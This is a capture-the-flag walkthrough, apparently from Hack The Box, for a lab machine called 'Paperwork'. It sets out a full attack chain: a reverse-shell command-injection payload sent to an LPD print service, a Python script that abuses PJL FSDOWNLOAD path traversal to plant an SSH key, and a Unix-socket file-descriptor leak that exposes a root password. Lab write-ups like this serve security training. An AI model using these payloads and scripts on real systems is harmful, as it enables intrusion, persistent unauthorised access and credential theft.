#HTB Paperwork – Technical Walkthrough
'''text
================================================================================
1. INITIAL ENUMERATION
================================================================================

Web application displayed informational page with key disclosures:

  Protocol            : RFC 1179
  Target Queue        : archive_intake
  Processor           : paperwork-archive-v1.02
  Backend spooler     : PRN-ARCHIVE-01

Key observation: Page references RFC1179, print queue, legacy gateway, backend
spooler. All printing-related. Attack surface likely the printing infrastructure.

================================================================================
2. PORT ENUMERATION
================================================================================

nmap -sC -sV -Pn <IP>

Discovered:
  22/tcp   open  ssh
  80/tcp   open  http
  1515/tcp open  ifor-protocol (LPD)

Port 1515 matches LPD (RFC1179). Confirms print service is intended vector.

================================================================================
3. UNDERSTANDING RFC1179
================================================================================

RFC1179 defines Line Printer Daemon protocol. Print server receives jobs with
fields: Hostname, Job Name, User, Queue.

These should be treated as plain text data, not executable code.

================================================================================
4. COMMAND INJECTION DISCOVERY
================================================================================

Vulnerable LPD service failed to sanitize supplied fields. One field
(likely Job Name or User) executed inside a shell.

Payload:
  '; bash -i >& /dev/tcp/LHOST/4444 0>&1 #

================================================================================
5. STAGE 1 – REVERSE SHELL
================================================================================

Attacker:
  nc -lvnp 4444

Run LPD exploit with injection payload.

Result:
  uid=7(lp)

Current user is 'lp' (printer service account only).

================================================================================
6. ENUMERATION AS lp
================================================================================

id
hostname
ps aux
ss -tlnp

Interesting discovery:
  127.0.0.1:9100  (JetDirect/Raw Printing/PJL)

Only listening locally – accessible only after shell.

================================================================================
7. INVESTIGATING PORT 9100 (JETDIRECT / PJL)
================================================================================

Port 9100 commonly used for JetDirect, Raw Printing, Printer Job Language (PJL).

Real printers support:
  @PJL INFO
  @PJL FSQUERY
  @PJL FSDOWNLOAD

FSDOWNLOAD syntax:
  @PJL FSDOWNLOAD NAME="<path>" SIZE=<bytes>
  <raw file contents>

================================================================================
8. PATH TRAVERSAL IN FSDOWNLOAD
================================================================================

Daemon incorrectly trusted supplied filename. Accepted paths like:
  0:./../../../home/archivist/.ssh/authorized_keys

Sequence ../../../ escapes printer storage sandbox.

================================================================================
9. SSH KEY GENERATION (ATTACKER MACHINE)
================================================================================

ssh-keygen -t ed25519 -f ~/paperwork/archivist_key -N ""
cat ~/paperwork/archivist_key.pub

Copy full output line (ssh-ed25519 AAAA...).

================================================================================
10. WRITING authorized_keys VIA PJL
================================================================================

Exploit sends @PJL FSDOWNLOAD with:
  NAME="0:./../../../home/archivist/.ssh/authorized_keys"

File contents = public key line.

Daemon runs as 'archivist' → OS allows write to ~/.ssh/authorized_keys.

NOT a permission bypass – vulnerability is missing path validation.

Script executed on target (lp shell):
  cat > /tmp/pub.key << 'EOF'
  <copied public key>
  EOF

  cat > /tmp/writekey.py << 'EOF'
  import socket
  pubkey = open("/tmp/pub.key", "rb").read().strip() + b"\n"
  path = "0:./../../../home/archivist/.ssh/authorized_keys"
  cmd = f'@PJL FSDOWNLOAD NAME="{path}" SIZE={len(pubkey)}\r\n'.encode()
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.settimeout(5)
  s.connect(("127.0.0.1", 9100))
  s.send(b"\x1b%-12345X" + cmd + pubkey + b"\x1b%-12345X\r\n")
  try:
      print(s.recv(4096))
  except socket.timeout:
      print("no response within 5s")
  s.close()
  EOF

  python3 /tmp/writekey.py

Expected output: b'OK\r\n' or similar success.

================================================================================
11. STABLE FOOTHOLD AS archivist
================================================================================

Attacker machine:
  ssh -i ~/paperwork/archivist_key archivist@<IP>

Current user: archivist

Retrieve user flag:
  cat ~/user.txt

================================================================================
12. ROOT ENUMERATION FROM archivist
================================================================================

Standard Linux enumeration:
  sudo -l
  find / -perm -4000 -type f
  getcap -r /
  ps aux
  ss -xlp
  find /run -type s

Discovered:
  paperwork-daemon running as root (PID 1497)

================================================================================
13. INVESTIGATING IPC – UNIX DOMAIN SOCKET
================================================================================

List Unix sockets:
  ss -xlp
  find /run -type s

Result:
  /run/paperwork/mgmt.sock

Permissions:
  srw-rw---- root archivist

Meaning: root owns it, archivist group may connect.

================================================================================
14. MANUAL SOCKET ENUMERATION
================================================================================

Connect:
  socat - UNIX-CONNECT:/run/paperwork/mgmt.sock

Received:
  STATUS: SYSTEM_CLEAN
  SIGNATURE: d92938059e3e5371cf54db65d60963aecacedf69e493c44a8b618036b07cbdbe

Confirms:
  - Service alive
  - Custom protocol
  - Root daemon accepts requests from archivist

================================================================================
15. DEEPER ANALYSIS – recvmsg() AND ANCILLARY DATA
================================================================================

Normal client uses recv() → only receives text message.

Unix Domain Sockets support recvmsg() → can receive:
  - Normal data
  - Credentials (SCM_CREDENTIALS)
  - File descriptors (SCM_RIGHTS)

Researcher used recvmsg() instead of recv().

================================================================================
16. FILE DESCRIPTOR LEAK (SCM_RIGHTS)
================================================================================

Using recvmsg() revealed ancillary data containing SCM_RIGHTS.

Daemon unintentionally transferred open file descriptors:
  FD 5
  FD 6

================================================================================
17. READING LEAKED FILE DESCRIPTORS
================================================================================

os.pread(fd, 4096, 0) reads from already-open descriptor without filename.

FD 5 contained log file.
FD 6 contained:
  ADMIN_PASSWORD=<REDACTED>

================================================================================
18. ROOT ACCESS
================================================================================

su
Password: <REDACTED>

Result: root shell

Retrieve root flag:
  cat /root/root.txt

================================================================================
19. COMPLETE ATTACK CHAIN SUMMARY
================================================================================

Web Information Disclosure (RFC1179, print queue, spooler)
                    │
                    ▼
Port Enumeration → Port 1515 (LPD)
                    │
                    ▼
LPD Command Injection → Reverse Shell (lp)
                    │
                    ▼
Local Enumeration → Port 9100 (JetDirect/PJL)
                    │
                    ▼
PJL FSDOWNLOAD Path Traversal
                    │
                    ▼
Overwrite ~/.ssh/authorized_keys (archivist)
                    │
                    ▼
SSH as archivist → User Flag
                    │
                    ▼
Root Enumeration → paperwork-daemon (root) + /run/paperwork/mgmt.sock
                    │
                    ▼
Unix Socket Analysis → recvmsg() → SCM_RIGHTS leak
                    │
                    ▼
Read ADMIN_PASSWORD from leaked FD
                    │
                    ▼
su root → Root Flag
'''
